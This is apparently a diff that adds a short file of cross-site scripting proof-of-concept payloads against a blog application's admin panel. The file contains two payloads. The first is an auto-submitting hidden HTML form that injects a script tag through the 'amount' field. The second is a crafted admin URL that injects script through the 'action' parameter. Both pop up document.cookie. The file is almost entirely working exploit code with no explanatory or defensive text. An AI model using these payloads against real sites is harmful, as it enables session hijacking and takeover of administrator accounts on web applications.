@@ -1,0 +1,19 @@
+Cross Site Scripting POCs:
+
+&lt;form action=&quot;http://host/admin/index.php&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;blogid&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;itemid&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;browseowncomments&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&#039;10&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;start&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;search&quot; value=&quot;&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+
+http://www.example.com/admin/index.php?action=settingsedit&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
